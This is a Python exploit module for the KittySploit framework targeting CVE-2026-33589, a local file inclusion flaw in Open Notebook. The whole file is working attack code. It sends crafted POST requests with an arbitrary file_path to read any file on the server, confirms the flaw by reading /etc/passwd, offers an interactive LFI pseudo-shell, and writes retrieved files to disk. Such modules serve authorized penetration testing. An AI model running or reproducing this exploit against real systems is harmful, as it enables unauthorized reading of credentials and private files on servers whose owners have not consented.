#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-33589 — Open Notebook LFI via unsanitized file_path."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi
from lib.scanner.http.response_validation import parse_json_response


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        "name": "Open Notebook LFI (CVE-2026-33589)",
        "description": (
            "CVE-2026-33589 in Open Notebook <= 1.8.3: POST /api/sources/json accepts "
            "type=upload with an arbitrary file_path and returns full_text from any file "
            "readable by the process. Unauthenticated when OPEN_NOTEBOOK_PASSWORD is unset."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-33589"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-33589",
            "https://www.cve.org/CVERecord?id=CVE-2026-33589",
        ],
        "tags": [
            "open-notebook",
            "lfi",
            "path-traversal",
            "file-read",
            "unauthenticated",
            "cve-2026-33589",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "endpoint_pattern_any": ["/api/sources/json"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "file_read", "from_detail": "file_path LFI"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(5055, "Open Notebook HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    auth_token = OptString(
        "",
        "Bearer token when OPEN_NOTEBOOK_PASSWORD is set on the target",
        False,
    )
    output_file = OptString("", "Local file to write retrieved content", False)
    output_limit = OptInteger(
        12000,
        "Max characters to print when output_file is empty (0 = full)",
        False,
        advanced=True,
    )

    def execute(self, file_path: str) -> str:
        remote = (file_path or "").strip()
        if not remote:
            return ""

        base = (self.path or "/").rstrip("/")
        endpoint = f"{base}/api/sources/json" if base else "/api/sources/json"
        headers = {"Content-Type": "application/json"}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"

        response = self.http_request(
            method="POST",
            path=endpoint,
            json={"type": "upload", "file_path": remote},
            headers=headers,
            timeout=max(int(self.timeout or 15), 30),
        )
        if not response:
            return ""

        if response.status_code == 401:
            print_error("Authentication required (401) — set auth_token")
            return ""
        if response.status_code == 400:
            body, _ = parse_json_response(response)
            detail = str((body or {}).get("detail") or (response.text or "")[:300])
            if "uploads directory" in detail or "Invalid file path" in detail:
                print_error(f"Path traversal blocked (patched): {detail[:200]}")
            else:
                print_error(f"Request rejected (400): {detail[:200]}")
            return ""
        if response.status_code != 200:
            print_error(f"Unexpected HTTP {response.status_code}")
            return ""

        body, err = parse_json_response(response)
        if err or not body:
            print_error(err or "invalid JSON response")
            return ""

        full_text = body.get("full_text") or ""
        if full_text:
            return full_text

        fallback = f"{base}/api/sources" if base else "/api/sources"
        print_status(f"Empty full_text — retrying multipart POST {fallback}")
        response = self.http_request(
            method="POST",
            path=fallback,
            data={"type": "upload", "file_path": remote},
            headers={"Authorization": headers["Authorization"]} if self.auth_token else None,
            timeout=max(int(self.timeout or 15), 30),
        )
        if response and response.status_code == 200:
            body, err = parse_json_response(response)
            if not err and body:
                return body.get("full_text") or ""
        return ""

    def check(self):
        try:
            base = (self.path or "/").rstrip("/")
            health_path = f"{base}/health" if base else "/health"
            headers = {}
            if self.auth_token:
                headers["Authorization"] = f"Bearer {self.auth_token}"
            health = self.http_request(
                method="GET",
                path=health_path,
                headers=headers or None,
                timeout=int(self.timeout or 15),
            )
            if health and health.status_code == 401:
                return {
                    "vulnerable": False,
                    "reason": "API requires authentication — set auth_token",
                    "confidence": "high",
                }
        except Exception as exc:
            return {
                "vulnerable": False,
                "reason": f"health check failed: {exc.__class__.__name__}",
                "confidence": "low",
            }

        data = self.execute("/etc/passwd")
        if not data:
            return {
                "vulnerable": False,
                "reason": "Could not read /etc/passwd via /api/sources/json",
                "confidence": "high",
            }

        first_line = data.splitlines()[0] if data.splitlines() else data[:80]
        return {
            "vulnerable": True,
            "reason": f"CVE-2026-33589 confirmed — /etc/passwd first line: {first_line[:120]}",
            "confidence": "high",
        }

    def run(self):
        try:
            print_status("CVE-2026-33589 — Open Notebook LFI")

            base = (self.path or "/").rstrip("/")
            health_path = f"{base}/health" if base else "/health"
            headers = {}
            if self.auth_token:
                headers["Authorization"] = f"Bearer {self.auth_token}"
            try:
                health = self.http_request(
                    method="GET",
                    path=health_path,
                    headers=headers or None,
                    timeout=int(self.timeout or 15),
                )
                if health:
                    print_status(f"GET {health_path} -> HTTP {health.status_code}")
                    if health.status_code == 401:
                        print_error("API requires authentication — set auth_token")
                        return False
            except Exception as exc:
                print_warning(f"Health check failed: {exc.__class__.__name__}")

            if self.shell_lfi:
                print_status("LFI pseudo-shell (paths read via /api/sources/json)")
                self.handler_lfi()
                return True

            remote = (self.file_read or "").strip()
            if not remote:
                print_error("file_read is required")
                return False

            data = self.execute(remote)
            if not data:
                return False

            local = (self.output_file or "").strip()
            if local:
                try:
                    with open(local, "w", encoding="utf-8", errors="replace") as fh:
                        fh.write(data)
                    print_success(f"Wrote {len(data)} bytes to {local}")
                except OSError as exc:
                    print_error(f"Failed to write {local}: {exc}")
                    return False
            else:
                limit = int(self.output_limit or 0)
                if limit > 0 and len(data) > limit:
                    print_info(data[:limit])
                    print_warning(f"... truncated ({len(data)} bytes total; set output_limit 0 for full)")
                else:
                    print_info(data)

            print_success(f"File '{remote}' read successfully")
            return True

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
